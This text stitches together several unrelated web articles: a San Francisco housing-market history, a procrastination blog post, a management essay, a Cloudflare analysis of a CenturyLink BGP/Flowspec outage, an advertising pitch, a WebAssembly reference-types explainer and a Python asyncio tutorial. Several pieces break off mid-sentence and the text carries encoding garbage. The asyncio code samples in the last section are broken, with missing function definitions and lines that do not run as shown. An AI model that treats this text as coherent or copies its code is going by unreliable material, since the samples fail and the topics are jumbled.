<p>However, it should be noted that the most recent subprime-financing/ loan-fraud bubble was truly abnormal in its scale, and its crash was much greater than other “market adjustments” going back many decades. The pre-2008 bubble was fueled by tens of millions of buyers purchasing (or owners refinancing) homes with loans that they clearly&nbsp;<em>couldn’t afford</em>&nbsp;right from the get go: Liar loans, deceptive teaser rates, promises of non-stop appreciation, and the abysmal decline in underwriting standards. (Since lenders were simply selling the loans, they didn’t care about qualifying buyers anymore.) Sometimes there was no actual investment in the properties being bought, i.e. no down payment, 100%+ loans. Many lenders and mortgage brokers clearly engaged in criminally predatory behavior, convincing people to overload themselves with unsustainable, impossible-to-pay-back levels of debt. (Sadly, something similar has been going on in recent years with college loans.)</p>
<p>The market adjustments of the early 1990’s and that subsequent to the dotcom bubble saw declines in home values in the range of 10% to 11%, which is of a&nbsp;<em>completely different scale</em>&nbsp;from the recent 2008 – 2011 crash and decline, when values plunged by up to 60% around the state and country, depending on area and price segment. The previous crash of a similar magnitude was during the Great Depression of the 1930’s.</p>
<p><u>This is important context when contemplating the next adjustment</u>: It doesn’t have to be a devastating crash. It can be more like some air being let out of an over-pressurized tire instead of a blowout on the highway at high speed. As of early-2017, it appears that the SF economy and housing market have cooled to some degree after 4 years of feverish appreciation. But the change varies by segment: The affordable house segment remains quite hot; more expensive house prices have generally plateaued; the condo market has cooled much more and seen price declines, and the luxury condo market has cooled the most. The condo market has been affected by the surge of new-construction condos hitting the market recently. We will have to wait and see the scale and speed of any further adjustment, but so far, we don’t see local or macro-economic conditions for a 2008-like crash. Adjustment, yes; devastating crash, no.

<p>The light blue columns in the above chart graph the home-value appreciation that occurred in the&nbsp;<u>first three years</u>&nbsp;of each recovery – our latest rebound has been somewhat quicker than other recoveries, probably due to 1) the depth of the previous market decline, and 2) the huge, high-tech employment, population and wealth boom that has played out in San Francisco and nearby counties. The gray columns chart the appreciation of past recoveries from the beginning to&nbsp;<em>peak value</em>&nbsp;for each cycle (except for the latest cycle, for which the peak has not yet been defined), and the red bars delineate the percentage declines from those peaks, pursuant to the market adjustments that occurred. As always, note that market appreciation and depreciation rates can vary widely by county, community and neighborhood.</p>
<p>Over the past 30+ years, the period between a recovery beginning and a bubble popping (or a lesser adjustment occurring) has run 5 to 7 years. We are currently about 5 years into the current recovery, which started in early 2012 (in San Francisco; later in outlying Bay Area counties). Periods of market recession/doldrums following the popping of a bubble have typically lasted about 3-4 years. (The 2001 dotcom bubble/ 9-11 crisis drop being the exception.) Generally speaking, within about 2-3 years of a new recovery commencing, previous peak values (i.e. those at the height of the previous bubble) are re-attained — among other reasons, there is the recapture of inflation during the doldrums years. In this current recovery, those homes hit hardest by the subprime loan crisis — typically housing at the lowest end of the price scale in the less affluent neighborhoods, which experienced by far the biggest bubble and biggest crash — are appreciating quickly now, but taking longer to re-attain peak values. However, communities with higher priced homes — such as in San Francisco, Marin, San Mateo and Central Contra Costa Counties (Diablo Valley &amp; Lamorinda) — have surged well past their previous peaks.</p>
<p>This does not mean that these recently recurring time periods necessarily reflect some natural law in housing market cycles, or that they can be relied upon to predict the future. Real estate markets can be affected by a bewildering number of local, national and international economic, political and even natural-event factors that are exceedingly difficult or even impossible to predict with any accuracy.</p>
<p>In the 2 charts below tracking the S&amp;P Case-Shiller Home Price Index for the 5-County San Francisco Metro Area, the data points refer to home values as a percentage of those in January 2000. January 2000 equals 100 on the trend line: 66 means prices were 66% of those in January 2000; 175 signifies prices 75% higher.</p>

<p>In the above chart, the country is just coming out of the late seventies, early eighties recession featuring terrible inflation, stagnant economy (“stagflation”) and incredibly high interest rates (hitting 18%). As the economy recovered, the housing market started to appreciate and this surge in values began to accelerate deeper into the decade. Over 6 years, the market appreciated about 100%. Finally, the late eighties “Greed is good!” version of irrational exuberance — junk bonds, stock market swindles, the Savings &amp; Loan implosion, as well as the late 1989 earthquake here in the Bay Area — ended the party.</p>
<p>Recession arrived, home prices sank about 11%, sales activity plunged and the market stayed basically flat for 4 to 5 years. Still, even after the decline, home values were 70% higher than when the boom began in 1984.</p>

<p>This next cycle looks similar but elongated. In 1996, after years of recession, the market suddenly took off and continued to accelerate til 2001. The dotcom bubble pop and September 2001 attacks created a market hiccup (a short-term 10% decline, but only for high-price tier houses, and for condos), but then the subprime and refinance insanity, degraded loan underwriting standards, mortgage securitization, …</p></div></div>

<p><i>Me when I have something more important I need to do</i></p>

<p>I am a serial procrastinator. If I have something I want to do, like work on a side project or write something, I will find ways to anything else except that. I go through phases where I can keep myself somewhat focused, but I always seem to drift back into my old bad habits after awhile. Recently though, I’ve started finding ways to turn this procrastination time into something better, what I’ll call “productive procrastination”.</p>

<p>My usual activity when I’m wasting time is watching people play video games on Twitch, or just watching whatever comes up in my Youtube feed. This time is completely useless. I don’t learn any new skills, I don’t grow as a person, and I can’t even discuss it later with friends because nobody I know watches this stuff. This is just pure time annihilation, that time just disappears from my life leaving me nothing to show for it, as if it never existed to begin with.</p>

<p>Recently, I’ve started finding ways to channel my brain’s craving for distraction and avoidance into activities that <em>do</em> have some benefits. I’d still rather I could stay focused on what I want to work on, but this time it isn’t a complete waste, and might even have the potential to be life-changing. My new addictions are learning Ukulele and cycling, although not at the same time (yet!).</p>

<p>My newfound love of Ukulele came as a real surprise to me. My girlfriend bought me a cheap Ukulele about a month ago almost as a joke gift, and I started watching some Youtube videos to see if I could at least learn how to to play something really basic. I’ve never played a musical instrument before, and I always assumed I just never would. Growing up there were people who did music, and those who didn’t, and I was always firmly in the latter camp. But for whatever reason, I’ve found Ukulele really addicting. Whenever I feel that wall of mental resistance to doing the task at hand, I just pick up the Ukulele and start trying to learn some new chords, or try playing a new song. It’s a perfect size to be able to just have next to me whenever I’m at my apartment, and I can see progress really quickly. Most importantly, my brain treats it as a fun distraction, so I’ve been able to sneak Ukulele practice in instead of my usual binge Twitch watching. Now while I’m procrastinating I’m learning a real skill, and feel like there’s a whole world of music that might be just around the corner if I keep it up. Who knows, maybe I could even join a band someday!</p>

<p>My other new distraction has been cycling. Cycling was something I used to love years ago, but since moving around and living in tiny apartments I’ve never owned a bike. Now, with the covid lockdowns and my reaching the limits of my sanity staying inside my tiny apartment all day every day, I decided to get a tiny folding bike. Since then biking has become my go-to way of distracting myself when I should be doing something else. Now at least I’m getting good exercise and discovering all sorts of new places around me I’ve never even known exist. I can go on rides with friends and who knows, maybe I’ll even join a biking group once things start calming down and get some social contact out of it. Instead of feeling sick and disgusted with myself laying on the couch watching hours of Youtube nonsense with glazed over eyes, I can come back from a several hour long ride feeling refreshed and amazing. Still, I’d rather I could keep myself focused, but if not at least I can stay healthy in the process!</p>

<p>I’ve come to realize not all time spent procrastinating is equal. There’s definitely a hierarchy of how I can spend my time while still distracting my brain, and I’ve started trying to nudge myself into these higher-value activities when I need a break. I’m still procrastinating, but I’m doing it productively!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"> <article>   <p>When I started managing about a decade ago I was terrible for the reasons many founders are: I’m my own biggest critic. I have extremely high expectations for myself, and as a result have high expectations for others. The frustration of incompetence blinded me from seeing the problem for what it was.</p> <p>It took me years to learn that there’s a separation between the words you <em>want</em> to say and the words that <em>get the job done</em>. I realized humans are systems, and if someone isn’t performing, I needed to fix the root cause, not complain about the proximal issue. Also, while actions might be globally irrational, they are always locally rational to the actor. The employee thinks they’re doing the right thing.</p> <p>Rage doesn’t work. What I learned does work (after years of trying) is curiosity. Curiosity about what caused the person to make a mistake.</p> <ul> <li>“Not productive enough” -&gt; Do they feel too restricted in their role to be productive?</li> <li>“Too distracted” -&gt; How clear is it to them what <em>you</em> want them to do?</li> <li>“Demoralizing the team” -&gt; Why are they unhappy, in general?</li> </ul> <p>It becomes interesting not just to understand the deeper issue, but to brainstorm how you might construct the most compelling reality <em>for them</em>. A CEO is like a dream architect in Inception, and your “IC work” is designing a thrilling environment for everyone to dream in.</p> <p>A good prompt I use is just that – “How can I make this <em>awesome</em> for X?”. Try it next time instead of complaining. It works!</p> <h3 id="millennials">Millennials</h3> <p>I’ve also swung in the opposite direction, constantly feeling insecure that – <em>heaven forbid</em> – an engineer might find their work boring for an hour or two.</p> <p>While you do need to direct a movie for your team that’s broadly exciting, it does not need to be a Christopher Nolan $500M epic thriller. Even the CEO does boring work. Boring work is fine.</p> <p>It took me a while to understand that I’m allowed to say things like “I need you to do X for me”. This is even ideal at certain moments. People want a leader that comports themselves with gravitas and authority. (These “sudo” moments have a certain cost to them. It shouldn’t be the majority of your interactions, but it certainly can be some.)</p> <p>And if not, there is plenty of capable engineering talent around the world that will happily be paid to do the work. Silicon Valley, while mostly being a tremendously positive cultural exporter, has also bred a generation of talent that has an adversarial relationship with work. A cohort of developers that grew up with so much excess, it views work as something to do the bare minimum of, instead of take pride in. (I find these people very easy to screen for: they’re simply unhappy in general.)</p> <h3 id="closing">Closing</h3> <p>If they aren’t performing, take a breath, quell the rage, and ask yourself “why”. And feel free to ask people to work if you employ them.</p> </article>   </div></div>]]>

<p><img src="https://blog-cloudflare-com-assets.storage.googleapis.com/2020/08/4-1.png" alt="Analysis of Today's CenturyLink/Level(3) Outage"></p>
<p>Today CenturyLink/Level(3), a major ISP and Internet bandwidth provider, experienced a significant outage that impacted some of Cloudflare’s customers as well as a significant number of other services and providers across the Internet. While we’re waiting for a post mortem from CenturyLink/Level(3), I wanted to write up the timeline of what we saw, how Cloudflare’s systems routed around the problem, why some of our customers were still impacted in spite of our mitigations, and what appears to be the likely root cause of the issue.</p>
<h3>Increase In Errors</h3>
<p>At 10:03 UTC our monitoring systems started to observe an increased number of errors reaching our customers’ origin servers. These show up as â€œ522 Errorsâ€� and indicate that there is an issue connecting from Cloudflare’s network to wherever our customers’ applications are hosted. </p>
<p>Cloudflare is connected to CenturyLink/Level(3) among a large and diverse set of network providers. When we see an increase in errors from one network provider, our systems automatically attempt to reach customers’ applications across alternative providers. Given the number of providers we have access to, we are generally able to continue to route traffic even when one provider has an issue.</p>

<h3>Automatic Mitigations</h3>
<p>In this case, beginning within seconds of the increase in 522 errors, our systems automatically rerouted traffic from CenturyLink/Level(3) to alternate network providers we connect to including Cogent, NTT, GTT, Telia, and Tata.</p>
<p>Our Network Operations Center was also alerted and our team began taking additional steps to mitigate any issues our automated systems weren’t automatically able to address beginning at 10:09 UTC. We were successful in keeping traffic flowing across our network for most customers and end users even with the loss of CenturyLink/Level(3) as one of our network providers.</p>

<p>The graph below shows traffic between Cloudflare’s network and six major tier-1 networks that are among the network providers we connect to. The red portion shows CenturyLink/Level(3) traffic, which dropped to near-zero during the incident. You can also see how we automatically shifted traffic to other network providers during the incident to mitigate the impact and ensure traffic continued to flow.</p>

<p>The following graph shows 522 errors (indicating our inability to reach customers’ applications) across our network during the time of the incident. </p>
<p><img src="https://blog-cloudflare-com-assets.storage.googleapis.com/2020/08/4-2.png" alt="Analysis of Today's CenturyLink/Level(3) Outage"></p>
<p>The sharp spike up at 10:03 UTC was the CenturyLink/Level(3) network failing. Our automated systems immediately kicked in to attempt to reroute and rebalance traffic across alternative network providers, causing the errors to drop in half immediately and then fall to approximately 25 percent of the peak as those paths were automatically optimized.</p>
<p>Between 10:03 UTC and 10:11 UTC our systems automatically disabled CenturyLink/Level(3) in the 48 cities where we’re connected to them and rerouted traffic across alternate network providers. Our systems take into account capacity on other providers before shifting out traffic in order to prevent cascading failures. This is why the failover, while automatic, isn’t instantaneous in all locations. Our team was able to apply additional manual mitigations to reduce the number of errors another 5 percent.</p>
<h3>Why Did the Errors Not Drop to Zero?</h3>
<p>Unfortunately, there were still an elevated number of errors indicating we were still unable to reach some customers. CenturyLink/Level(3) is among the largest network providers in the world. As a result, many hosting providers only have single-homed connectivity to the Internet through their network.</p>
<p>To use the old Internet as a â€œsuperhighwayâ€� analogy, that’s like only having a single offramp to a town. If the offramp is blocked, then there’s no way to reach the town. This was exacerbated in some cases because CenturyLink/Level(3)’s network was not honoring route withdrawals and continued to advertise routes to networks like Cloudflare’s even after they’d been withdrawn. In the case of customers whose only connectivity to the Internet is via CenturyLink/Level(3), there was no way for us to reach their applications and they continued to see 522 errors until CenturyLink/Level(3) resolved their issue around 14:30 UTC.</p>
<p>The same was a problem on the other (â€œeyeballâ€�) side of the network. Individuals need to have an onramp onto the Internet’s superhighway. An onramp to the Internet is essentially what your ISP provides. CenturyLink is one of the largest ISPs in the United States.</p>
<p><img src="https://blog-cloudflare-com-assets.storage.googleapis.com/2020/08/5-1.png" alt="Analysis of Today's CenturyLink/Level(3) Outage"></p>
<p>Source: https://broadbandnow.com/CenturyLink</p>
<p>Because this outage appeared to take all of the CenturyLink/Level(3) network offline, individuals who are CenturyLink customers would not have been able to reach Cloudflare or any other Internet provider until the issue was resolved. Globally, we saw a 3.5% drop in global traffic during the outage, nearly all of which was due to a nearly complete outage of CenturyLink’s ISP service across the United States.</p>
<h3>So What Likely Happened Here?</h3>
<p>While we will not know exactly what happened until CenturyLink/Level(3) issue a post mortem, we can see clues from BGP announcements and how they propagated across the Internet during the outage. BGP is the Border Gateway Protocol. It is how routers on the Internet announce to each other what IPs sit behind them and therefore what traffic they should receive.</p>
<p>Starting at 10:04 UTC, there were a significant number of BGP updates. A BGP update is the signal a router makes to say that a route has changed or is no longer available. Under normal conditions, the Internet sees about 1.5MBs â€“ 2MBs of BGP updates every 15 minutes. At the start of the incident, the number of BGP updates spiked to more than 26MBs of BGP updates per 15 minute period and stayed elevated throughout the incident.</p>
<p><img src="https://blog-cloudflare-com-assets.storage.googleapis.com/2020/08/6-1.png" alt="Analysis of Today's CenturyLink/Level(3) Outage">Source: http://archive.routeviews.org/bgpdata/2020.08/UPDATES/</p>
<p>These updates show the instability of BGP routes inside the CenturyLink/Level(3) backbone. The question is what would have caused this instability. The CenturyLink/Level(3) status update offers some hints and points at a flowspec update as the root cause.</p>
<p><img src="https://blog-cloudflare-com-assets.storage.googleapis.com/2020/08/7-1.png" alt="Analysis of Today's CenturyLink/Level(3) Outage"></p>
<h3>What’s Flowspec?</h3>
<p>In CenturyLink/Level(3)’s update they mention that a bad Flowspec rule caused the issue. So what is Flowspec? Flowspec is an extension to BGP, which allows firewall rules to be easily distributed across a network, or even between networks, using BGP. Flowspec is a powerful tool. It allows you to efficiently push rules across an entire network almost instantly. It is great when you are trying to quickly respond to something like an attack, but it can be dangerous if you make a mistake.</p>
<p>At Cloudflare, early in our history, we used to use Flowspec ourselves to push out firewall rules in order to, for instance, mitigate large network-layer DDoS attacks. We suffered our own Flowspec-induced outage more than 7 years ago. We no longer use Flowspec ourselves, but it remains a common protocol for pushing out network firewall rules.</p>
<p>We can only speculate what happened at CenturyLink/Level(3), but one plausible scenario is that they issued a Flowspec command to try to block an attack or other abuse directed at their network. The status report indicates that the Flowspec rule prevented BGP itself from being announced. We have no way of knowing what that Flowspec rule was, but here’s one in Juniper’s format that would have blocked all BGP communications across their network.</p>
<pre><code>route DISCARD-BGP {
   match {
      protocol tcp;
      destination-port 179;
   }
 then discard;
}
</code></pre>
<h3>Why So Many Updates?</h3>
<p>A mystery remains, however, why global BGP updates stayed elevated throughout the incident. If the rule blocked BGP then you would expect to see an increase in BGP announcements initially and then they would fall back to normal.</p>
<p>One possible explanation is that the offending Flowspec rule came near the end of a long list of BGP updates. If that were the case, what may have happened is that every router in CenturyLink/Level(3)’s network would receive the Flowspec rule. They would then block BGP. That would cause them to stop receiving the rule. They would start back up again, working their way through all the BGP rules until they got to the offending Flowspec rule again. BGP would be dropped again. The Flowspec rule would no longer be received. And the loop would continue, over and over.</p>
<p>One challenge of this is that on every cycle, the queue of BGP updates would continue to increase within CenturyLink/Level(3)’s network. This may have gotten to a point where the memory and CPU of their routers was overloaded, causing an additional set of challenges to getting their network back online.</p>
<h3>Why Did It Take So Long to Fix?</h3>
<p>This was a significant global Internet outage and, undoubtedly, the CenturyLink/Level(3) team received immediate alerts. They are a very sophisticated network operator with a world class Network Operations Center (NOC). So why did it take more than four hours to resolve?</p>
<p>Again, we can only speculate. First, it may have been that the Flowspec rule and the significant load that large number of BGP updates imposed on their routers made it difficult for them to login to their own interfaces. Several of the other tier-1 providers took action, it appears at CenturyLink/Level(3)’s request, to de-peer their networks. This would have limited the number of BGP announcements being received by the CenturyLink/Level(3) network and helped give it time to catch up.</p>
<p>Second, it also may have been that the …</p></div></div>

				<div>
					<div><p>When it comes to online advertising, it’s our experience that digital marketers like you should be using both Google Ads and Display and Video 360 for optimum advertising performance. </p>

<p>After all, many of you have likely seen a positive ROI from your Google Ads campaigns, and we all know that this staple of CPC advertising is a must-have for any business. However, we can safely say that to improve on that ROI, you need to be adding Display and Video 360 to your Google Ads account. </p>

<p>Not only does DV360 allow you to access more advertising networks and third-party data providers, but it gives you more versatility in the advertising campaigns you create. Its powerful creative tools can help you craft stunning ads that you can put in front of your exact target audience, given that it allows you to target more metrics than Google Ads.</p>

<p>In addition, DV360 gives you more control over your advertising budget. You can customize all of your bidding based on your goals, and the ability to input a budget and have the Bid Manager stop when that budget is reached means you’ll always know what you’re spending on your ad campaigns. </p>

<p>However, it would be unrealistic for us to say that DV360 is the perfect solution for every business. </p>

<p>As with any new part of your marketing strategy, we recommend that you test DV360 in parallel to your other advertising campaigns, and in particular to Google Ads, to determine each platform’s ability to deliver a positive ROI. Only then will you be able to determine which advertising platform is the best for your business.

into the exciting world of garbage-collected references. This article will
explain what the reference types proposal enables, what it leaves for future
proposals, and how it is implemented in Wasmtime.</p>

<h2 id="what-are-reference-types">What are Reference Types?</h2>

<p>Without the reference types proposal, WebAssembly can only manipulate simple
integer and floating point values. It can’t take or return references to the
host’s objects like, for example, a DOM node on a Web page or an open connection
on a server. There are workarounds: for example, you can store the host objects
in a side table and refere to them by index, but this adds an extra indirection
and implementing the side table requires cooperating glue code on the host
side. That glue code, in particular, is annoying because it is outside of the
Wasm sandbox, diluting Wasm’s safety guarantees, and it is host-specific. If you
want to use your Wasm module on the Web, in a Rust host, and in a Python host,
you’ll need three separate glue code implementations. This makes WebAssembly
less attractive as a universal binary format.</p>

<p>With the reference types proposal, you don’t need glue code to interact with
host references. The proposal has three main parts:</p>

<ol>
  <li>
    <p>A new <code>externref</code> type, representing an opaque, unforgable reference to a
host object.</p>
  </li>
  <li>
    <p>An extension to WebAssembly tables, allowing them to hold <code>externref</code>s in
addition to function references.</p>
  </li>
  <li>
    <p>New instructions for manipulating tables and their entries.</p>
  </li>
</ol>

<p>With these new capabilities, Wasm modules can talk about host references
directly, rather than requiring external glue code running in the host.</p>

<p><code>externref</code>s play nice with WebAssembly’s sandboxing properties:</p>

<ul>
  <li>
    <p>They are <em>opaque</em>: a Wasm module cannot observe an <code>externref</code> value’s bit
pattern. Passing a reference to a host object into a Wasm module doesn’t
reveal any information about the host’s address space and the layout of host
objects within it.</p>
  </li>
  <li>
    <p>They are <em>unforgable</em>: a Wasm module can’t create a fake host reference out of
thin air. It can only return either a reference you already gave it or the
null reference. It <em>cannot</em> pretend like the integer value <code>0x1bad2bad</code> is a
valid host reference, return it to you, and trick you into dereferencing this
invalid pointer.</p>
  </li>
</ul>

<h2 id="example">Example</h2>

<p>Here’s a Wasm module that exports a <code>hello</code> function which takes, as an
<code>externref</code> parameter, a reference to an open file and writes “Hello, Reference
Types!” to the file. This module imports the <code>write</code> syscall from a hypothetical
future version of <a href="https://wasi.dev/">WASI</a>, the WebAssembly System Interface, that leverages
reference types.</p>

<p>This Wasm module will run in <em>any</em> WebAssembly environment where WASI is
available.<sup id="back-ref-wasi-available"><a href="#foot-ref-wasi-available">0</a></sup> We don’t need glue code that is
maintaining a side table, mapping host references to indices.</p>

<p>Running <code>hello.wat</code> — once again, without module-specific glue code
— is just as easy in <a href="https://github.com/bytecodealliance/wasmtime-dotnet/">.NET</a> and <a href="https://github.com/bytecodealliance/wasmtime-go">Go</a> host
environments, and is left as an exercise for the reader ;)</p>

<h3 id="on-the-web">On the Web</h3>

<p>Unlike the other host environments we’ve considered, WASI isn’t natively
implemented on the Web. There’s nothing stopping us, however, from polyfilling
WASI APIs with a little bit of JavaScript and a couple DOM methods! This is
still an improvement because there is overall less module-specific glue
code. Once one person has written the polyfills, everyone’s Wasm modules can
reuse them.</p>

<p>There are many different things an “open file” could be modeled by on the
Web. For this demo, we’ll use a DOM node: writing to it will append text
nodes. This works well because we know our module is only writing text data. If
we were working with binary data, we would choose another polyfilling approach,
like in-memory array buffers backing the file data.</p>

<p>Here is the JavaScript code to run our <code>hello.wat</code> module and polyfill our
<code>future-wasi.write</code> function:</p>

<div><div><pre><code><span>// The DOM node we will use as an "open file".</span>

<p>You can view a live demo of this code in the iframe below. It should work in
Firefox 79+, or any other browser that supports reference types (at the time of
writing, Chrome has support for an older version of the reference types proposal
behind the <code>--experimental-wasm-anyref</code> flag, and Safari has in-progress support
behind the <code>JSC_useWebAssemblyReferences</code> flag.)</p>



<h2 id="what-comes-after-the-reference-types-proposal">What Comes After the Reference Types Proposal?</h2>

<p>The in-progress <a href="https://github.com/WebAssembly/proposal-type-imports/blob/master/proposals/type-imports/Overview.md">WebAssembly type imports proposal</a> builds on
reference types to let you distinguish between different kinds of host objects:
database connections and open files would be separate types. Or, on the Web,
Wasm would distinguish JavaScript <code>Promise</code>s from DOM nodes. It also adds
references that point to types defined by other Wasm modules, not just host
objects.</p>

<p>WASI will want to adopt unforgable reference types for file handles, as the
examples above suggest, instead of using integers. It might make sense for WASI
to wait for type imports, however, so it can use separate types for, say, an
open file and a source of entropy. This is a decision for the WASI subgroup of
the WebAssembly Community Group. Either way, when WASI does make this switch, it
will continue to support integer file descriptors, but implemented inside the
Wasm sandbox as indices into an <code>externref</code> Wasm table.</p>

<p>The <a href="https://github.com/WebAssembly/interface-types/blob/master/proposals/interface-types/Explainer.md">interface types</a> and <a href="https://github.com/WebAssembly/module-linking/blob/master/proposals/module-linking/Explainer.md">module linking</a> proposals promise to remove even more
glue code and bindings. The interface …</p></div></div>

A lot has changed since I last published my post on handling long-running async tasks in Python using celery. Last time we used it to run a few async tasks to fetch data from some service which took around 1-5 minutes. You can read more about it in the post below.</p>

Although I will still use celery for these types of long-running tasks, there is a subset of tasks that are better handled inside the execution thread itself. Today we will discuss a way of handling such operations.</p>

<p>
To the people who know me, I switched to a new role which allowed me to write Node.js over a year ago and I have been working on it since then. During my time working and building APIs using it, I have started falling for the way in which Node handles Async behavior and long-running tasks.</p>
<p>
The idea is simple, if the task is waiting for some IO, we can run some other task in the mean-time. Only the part that needs it, will wait for it.</p><p>
I wanted to use the same concept in Python. Fortunately, in Python version <code>3.4</code>, they have introduced <code>asyncio</code> for the same purpose. In this post, we are going to talk a little about it and try to understand its importance.</p><p>
By the end of the post, you will be able to understand the importance of async functions and will be able to start using them into your codebase.</p>
<h2 id="prerequisite">Prerequisite</h2><p>
I am using <code>Python 3.8</code> for this tutorial and you might want to use the same to run and try out the examples. You can try them <a href="https://www.python.org/shell/">online as well</a>.</p>
<h2 id="basic-async-function-in-python">Basic async function in Python</h2><p>
This is how we write a basic async function in Python.</p>
<div><div><pre><code><span>import</span> <span>asyncio</span>

<span>async</span> <span>def</span> <span>func1</span><span>(</span><span>a</span><span>):</span>
    <span>print</span><span>(</span><span>"started func 1: {}"</span><span>,</span> <span>a</span> <span>+</span> <span>1</span><span>)</span>
    <span>await</span> <span>asyncio</span><span>.</span><span>sleep</span><span>(</span><span>1</span><span>)</span>
    <span>return</span> <span>a</span> <span>+</span> <span>1</span>

<span>asyncio</span><span>.</span><span>run</span><span>(</span><span>func1</span><span>(</span><span>1</span><span>))</span>
</code></pre></div></div>
<p><strong>Response</strong></p>
<p>
You have to start by importing the <code>asyncio</code> module.</p><p>
Async functions are defined just like a normal function, you just have to add the keyword, <code>async</code>. If you want to wait for the execution of some <a href="https://docs.python.org/3/library/asyncio-task.html#coroutines">coroutine</a>, you have to use the keyword, <code>await</code>.</p><p>
Finally, you can run the function using <code>asyncio.run</code> method.</p>
<blockquote>
Anytime you use the await keyword inside the async function, the thread will not move forward until we get a response from the called function.
</blockquote><p>
This simple implementation will not help you understand the advantage of using async functions. In the next section, we will talk about the time taken for the execution and there you will really start to see the difference.</p>
<h2 id="time-taken-for-the-full-execution">Time taken for the full execution</h2><p>
To understand the benefits of using <code>async</code> functions, we will compare the time taken to run the same code in <code>async</code> and <code>sync</code> behavior.</p><p>
Letâ€™s first write the async code.</p>
<div><div><pre><code><span>import</span> <span>asyncio</span>
<span>import</span> <span>time</span>
<span>start</span> <span>=</span> <span>time</span><span>.</span><span>time</span><span>()</span>

    <span>await</span> <span>asyncio</span><span>.</span><span>sleep</span><span>(</span><span>1</span><span>)</span>
    

<span>async</span> <span>def</span> <span>func1</span><span>(</span><span>a</span><span>):</span>
    <span>print</span><span>(</span><span>"started func 1: {}"</span><span>,</span> <span>a</span> <span>+</span> <span>1</span><span>)</span>

I have defined 4 different functions doing almost the same thing. Letâ€™s assume there is a long-running function called <code>async_sleep</code> which is doing some IO operation. For example: Fetching data from the database.</p>
<blockquote>
<code>asyncio.gather()</code> is used to run the tasks passed to it concurrently.
</blockquote><p>
The response after running this code is as follows.</p>
<div><div><pre><code><span>started</span> <span>func</span> <span>1</span><span>:</span> <span>2</span>
<span>started</span> <span>func</span> <span>2</span><span>:</span> <span>3</span>
<span>started</span> <span>func</span> <span>3</span><span>:</span> <span>4</span>
<span>started</span> <span>func</span> <span>4</span><span>:</span> <span>5</span>
<span>Completed</span> <span>after</span><span>:</span> <span>1.1852593421936035</span>
</code></pre></div></div><p>
The function completes the execution somewhere between 1-2 seconds for every execution. (Ran it 5 times to check).</p><p>
Now letâ€™s try to run the <code>sync</code> version of the same code.</p>
<div><div><pre><code><span>import</span> <span>time</span>
<span>start</span> <span>=</span> <span>time</span><span>.</span><span>time</span><span>()</span>

    <span>sync_sleep</span><span>()</span>
    <span>return</span> <span>a</span> <span>+</span> <span>3</span>


<span>def</span> <span>func4</span><span>(</span><span>a</span><span>):</span>
    <span>print</span><span>(</span><span>"started func 4: {}"</span><span>.</span><span>format</span><span>(</span><span>a</span> <span>+</span> <span>4</span><span>))</span>
    <span>sync_sleep</span><span>()</span>
    <span>return</span> <span>a</span> <span>+</span> <span>4</span>


<span>def</span> <span>main</span><span>():</span>

    <span>func2</span><span>(</span><span>1</span><span>)</span>

    <span>func4</span><span>(</span><span>1</span><span>)</span>
    <span>print</span><span>(</span><span>"Completed after: {}"</span><span>.</span><span>format</span><span>(</span><span>time</span><span>.</span><span>time</span><span>()</span> <span>-</span> <span>start</span><span>))</span>

<span>main</span><span>()</span>
</code></pre></div></div><p>
The response that we got after executing this was:</p>
<div><div><pre><code><span>started</span> <span>func</span> <span>1</span><span>:</span> <span>2</span>
<span>started</span> <span>func</span> <span>2</span><span>:</span> <span>3</span>
<span>started</span> <span>func</span> <span>3</span><span>:</span> <span>4</span>
<span>started</span> <span>func</span> <span>4</span><span>:</span> <span>5</span>
<span>Completed</span> <span>after</span><span>:</span> <span>4.168870687484741</span>
</code></pre></div></div><p>
This saved us <code>~3</code> seconds for executing 4 functions. Now if we wanted to run 10000 such functions, we would save ourselves <code>~2000</code> seconds/ i.e. <code>35-40</code> minutes.</p><p>
Thatâ€™s awesome, right.</p><p>
Even if we are just running 2-3 such functions in each iteration these small savings can be very important to provide better user experience to your customers.</p><p>
Now that we have understood the advantage of using <code>async</code> functions, we must know a few more things about it.</p>
<h2 id="order-of-execution-for-async-functions">Order of execution for async functions</h2><p>
We should understand that while running the functions in async mode, we donâ€™t really know about the order in which functions are executed. Letâ€™s understand the concept with an example.</p><p>
The functions will return as soon as the execution is completed.</p><p>
We can mock the different execution time by sleeping for a random time between 0 and 1 using, <code>random.randint(0, 10) * 0.1</code>.</p><p>
Here is the full code.</p>
<div><div><pre><code><span>import</span> <span>asyncio</span>

<span>asyncio</span><span>.</span><span>run</span><span>(</span><span>main</span><span>())</span>
</code></pre></div></div><p>
The response to the following code is,</p>
<div><div><pre><code><span>completed</span> <span>func</span> <span>0</span><span>:</span> <span>1</span>
<span>completed</span> <span>func</span> <span>3</span><span>:</span> <span>4</span>

<h2 id="practical-usage">Practical Usage</h2><p>
After the release of Python 3.8, which moved the <code>asyncio.run()</code> method to stable API, you can start using it without any problem.</p><p>
The only issue with moving from a <code>synchronous</code> approach to an async one, is to change the way of thinking about the problems. You have to change the way you think about every little detail. Once you reach that point of thinking in terms of async functions, believe me, you will love it.</p>
<h2 id="how-does-it-work-under-the-hood">How does it work under the hood?</h2><p>
Letâ€™s check the type of the async function.</p>
<div><div><pre><code><span>type</span><span>(</span><span>main</span><span>())</span>

<span># &lt;class 'coroutine'&gt;
</span></code></pre></div></div><p>
So, the async function is of type <code>coroutine</code>.</p><p>
This <a href="https://www.geeksforgeeks.org/coroutine-in-python/">GeeksForGeeks article</a> does a very good job of explaining coroutines.</p><p>
To sum up what they wrote in the post, <strong>subroutines</strong> are the set of instructions that have one entry point and are executed serially.</p><p>
On the other hand, <strong>Coroutines</strong> can suspend or give away the control to other Coroutines, allowing multiple tasks to run at the same time.</p><p>
Python uses this concept to allow async behavior.</p>
<h2 id="handling-timeout-in-async-functions">Handling timeout in async functions</h2><p>
It is necessary to have a timeout for waiting for the task to get completed. We are not supposed to wait forever for it to complete. <code>asyncio</code> also provided the ability to add a timeout to the async function so that you can skip the execution before its completion.</p><p>
A practical application of this can be a case when you are calling a third party API in your application and the third party itself is down. In that case, you donâ€™t want to wait for a long time.</p><p>
You can use the <code>timeout</code> method to solve your problem. See the code for example:</p>
<div><div><pre><code><span>async</span> <span>def</span> <span>async_sleep</span><span>():</span>
    <span>await</span> <span>asyncio</span><span>.</span><span>sleep</span><span>(</span><span>2</span><span>)</span>
    <span>print</span><span>(</span><span>'Execution completed'</span><span>)</span>

<span>async</span> <span>def</span> <span>main</span><span>():</span>
    <span>try</span><span>:</span>
